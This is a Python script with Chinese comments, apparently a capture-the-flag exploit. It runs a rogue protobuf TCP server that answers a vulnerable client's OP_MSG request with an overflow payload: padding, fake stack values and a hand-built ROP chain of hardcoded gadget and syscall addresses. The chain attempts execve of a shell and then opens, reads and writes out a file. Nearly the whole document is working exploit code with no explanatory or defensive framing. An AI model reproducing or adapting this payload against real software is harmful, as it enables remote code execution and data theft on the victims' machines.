import socket
import odd_pb2  # 生成的protobuf文件
import struct

def b64(addr):
    byte_array = struct.pack('<Q', addr)
    visible_byte_array = ''.join(f'{byte:02x}' for byte in byte_array)
    return visible_byte_array.encode()

def handle_client(client_socket):
    try:
        while True:
            # 接收数据
            data = client_socket.recv(1024)
            if not data:
                break

            # 解析protobuf消息
            message = odd_pb2.Message()
            message.ParseFromString(data)
            print(f"Received message: magic={hex(message.magic)}, seq={hex(message.seq)}, opcode={hex(message.opcode)}, cont={message.cont}")

            # 根据不同的opcode设置不同的处理逻辑
            response = odd_pb2.Message()
            response.magic = message.magic
            response.seq = message.seq + 1

            if message.opcode == odd_pb2.OP_HELLO:
                response.opcode = odd_pb2.OP_HELLO
                response.cont = b"helloOk"
            elif message.opcode == odd_pb2.OP_SESSION:
                response.opcode = odd_pb2.OP_SESSION
                response.cont = b"sessionOk"
            elif message.opcode == odd_pb2.OP_MSG:
                response.opcode = odd_pb2.OP_MSG
                response.cont = b"gg"*1040 
                #0x00000000004146a4 : pop rdi ; ret
                #0x00000000004161b3 : pop rsi ; ret
                #0x00000000006615ab : pop rdx ; pop rbx ; ret
                #0x000000000040101a : ret
                #0x0000000000494a49 : syscall
                syscall_addr=0x65c47b
                binshell_addr=0x763000 # 在 eh_frame 上随便放
                pop_rsi=0x4161b3
                pop_rdi=0x4146a4
                pop_rdx_rbx=0x6615ab
                pop_rax=0x54688a
                ret = 0x40101a
                close=0x65b420
                write=0x65b250
                read=0x65b1b0
                # syscall read and syscall binshell
                rop=b64(pop_rdi)+b64(0)+b64(pop_rsi)+b64(binshell_addr)+b64(pop_rdx_rbx-1)+b64(0x30)+b64(0)+b64(pop_rax)+b64(0)+b64(syscall_addr)
                rop+=b64(pop_rax)+b64(0x3b)+b64(pop_rdi)+b64(binshell_addr)+b64(pop_rsi)+b64(0)+b64(pop_rdx_rbx)+b64(0)+b64(0)+b64(syscall_addr)+b64(ret)
                rop+=b64(pop_rdi)+b64(0)+b64(close)+b64(pop_rdi)+b64(binshell_addr)+b64(pop_rsi)+b64(0)+b64(pop_rax)+b64(2)+b64(syscall_addr)
                rop+=b64(pop_rdi)+b64(0)+b64(pop_rsi)+b64(binshell_addr)+b64(pop_rdx_rbx-1)+b64(0x30)+b64(0)+b64(0x65b1b0)
                rop+=b64(pop_rdi)+b64(1)+b64(pop_rsi)+b64(binshell_addr)+b64(pop_rdx_rbx-1)+b64(0x30)+b64(write)
                
                response.cont += b64(0xdeadbeefdeed) + b64(0xdeadbeefdeed) + b'g'*16 + rop
                print(response)
            elif message.opcode == odd_pb2.OP_END:
                response.opcode = odd_pb2.OP_END
                response.cont = b"Ok"
            else:
                response.opcode = odd_pb2.OP_MSG
                response.cont = b"Unknown operation"

            # 发送响应消息
            client_socket.send(response.SerializeToString())
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

def start_server(host='0.0.0.0', port=5001):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server listening on {host}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Accepted connection from {addr}")
        handle_client(client_socket)

if __name__ == "__main__":
    start_server()